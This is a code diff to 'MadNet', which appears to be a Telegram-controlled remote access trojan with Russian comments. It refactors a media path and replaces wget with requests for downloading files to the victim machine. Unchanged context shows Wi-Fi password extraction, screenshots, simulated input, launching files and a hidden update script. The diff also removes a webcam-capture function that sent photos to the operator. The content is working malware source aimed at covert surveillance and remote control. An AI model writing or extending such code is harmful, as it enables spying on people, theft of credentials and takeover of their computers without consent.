@@ -5,18 +5,16 @@ import os
 import platform
 import subprocess
 import requests
-import wget
 import pyautogui
 import keyboard
 import telebot
 from cryptography.fernet import Fernet
-import cv2
 
 
 VERSION = '2.0'
 NAME_PROGRAM = 'MadNet'
 
-
+media_path = 'media/'
 name_file = "config"
 
 with open(name_file, 'rb') as file:
@@ -192,7 +190,7 @@ class Func_API:
 
     def find_name(self, fig):
         lop = 0
-        dir = os.listdir("media/")
+        dir = os.listdir(media_path)
         for i in dir:
             if i[:3] == fig:
                 lop += 1
@@ -201,9 +199,9 @@ class Func_API:
     def ren(self, path, content):
         vb = self.find_name(content)
         if content == "vid":
-            os.rename("media/" + path, "media/" + vb + ".mp4")
+            os.rename(media_path + path, media_path + vb + ".mp4")
         elif content == "pic":
-            os.rename("media/" + path, "media/" + vb + ".png")
+            os.rename(media_path + path, media_path + vb + ".png")
         return vb
 
     def cmdo_ret(self, com):  # нужно для работы ф-ции specifications
@@ -247,9 +245,9 @@ class Func_API:
             bot.send_message(self.id, f'Ошибка: {e}')
 
     def exits(self):  # очищает папку с медиа
-        dir = os.listdir("media/")
+        dir = os.listdir(media_path)
         for i in dir:
-            os.remove("media/" + i)
+            os.remove(media_path + i)
         bot.send_message(self.id, "Успешно")
 
     def ip_address(self):
@@ -284,9 +282,12 @@ class Func_API:
             logger.log(self.ip_address.__name__, 'Ошибка соединения')
             bot.send_message(self.id, 'Ошибка соединения')
 
-    def wgt(self, text_comand):  # скачивание файла по ссылке
+    def wgt(self, com):
         try:
-            wget.download(text_comand[0], text_comand[1])
+            data = requests.get(com[0])
+            if data.status_code == 200:
+                with open(com[1], 'wb') as f:
+                    f.write(data.content)
             bot.send_message(self.id, "Успешно")
         except Exception as e:
             logger.log(self.wgt.__name__, e)
@@ -312,7 +313,7 @@ class Func_API:
 
     def picture(self, file):  # открытие картинки из папки с медиа
         try:
-            command = f"media\\{file}.png"
+            command = f"{media_path}\\{file}.png"
             os.startfile(command)
             bot.send_message(self.id, "Успешно")
         except Exception as e:
@@ -321,7 +322,7 @@ class Func_API:
 
     def video(self, file):  # открытие видео из папки с медиа
         try:
-            command = f"media\\{file}.mp4"
+            command = f"{media_path}\\{file}.mp4"
             os.startfile(command)
             bot.send_message(self.id, "Успешно")
         except Exception as e:
@@ -408,7 +409,7 @@ Screen:        {x}x{y}"""
 
     def start_file(self, path):  # запускает файл по его path'у
         try:
-            text = "start media/" + path
+            text = f"start " + path
             os.system(text)
             bot.send_message(self.id, 'Успешно')
         except Exception as e:
@@ -534,30 +535,6 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
         except Exception as e:
             logger.log(self.extract_wifi_passwords.__name__, e)
             bot.send_message(self.id, f'Ошибка: {e}')
-
-    def webcam(self):
-        try:
-            name = f"{self.NAME_PC}_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
-            cap = cv2.VideoCapture(0)
-            for i in range(10):
-                cap.read()
-
-            ret, frame = cap.read()
-            cv2.imwrite(name, frame)
-
-            cap.release()
-            f = open(name, 'rb')
-            bot.send_document(self.id, f)
-            f.close()
-            os.remove(name)
-
-        except Exception as e:
-            logger.log(self.webcam.__name__, e)
-            bot.send_message(self.id, f'Ошибка: {e}')
-
-        except:
-            logger.log(self.webcam.__name__, '*Webcam not found*')
-            bot.send_message(self.id, '*Webcam not found*')
 
     def tasklist(self, pid):
         if '.' == pid:
@@ -685,9 +662,6 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
                 if comnd == "screenshot" or comnd == "scrn":
                     self.screenshot()
 
-                if comnd == "webcam" or comnd == "wcam":
-                    self.webcam()
-
                 if comnd == "inpt" or comnd == "input":
                     target = self.input_gui(text_comand[0])
 
@@ -748,7 +722,7 @@ def handle_docs_document(message):
     if message.chat.id in id:
         file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        src = 'media/' + message.photo[1].file_id
+        src = media_path + message.photo[1].file_id
         with open(src, 'wb') as new_file:
             new_file.write(downloaded_file)
         picu = func_api.ren(message.photo[1].file_id, "pic")
@@ -759,7 +733,7 @@ def handle_docs_document(message):
 def get_file(message):
     if message.chat.id in id:
         print(message.json)
-        file_name = 'media/' + message.json['video']['file_id']
+        file_name = media_path + message.json['video']['file_id']
         file_info = bot.get_file(message.video.file_id)
         with open(file_name, "wb") as f:
             file_content = bot.download_file(file_info.file_path)
@@ -774,7 +748,7 @@ def handle_file(message):
         try:
             file_info = bot.get_file(message.document.file_id)
             downloaded_file = bot.download_file(file_info.file_path)
-            src = 'media/' + message.document.file_name
+            src = media_path + message.document.file_name
             with open(src, 'wb') as new_file:
                 new_file.write(downloaded_file)
             bot.reply_to(message, "Успешно")
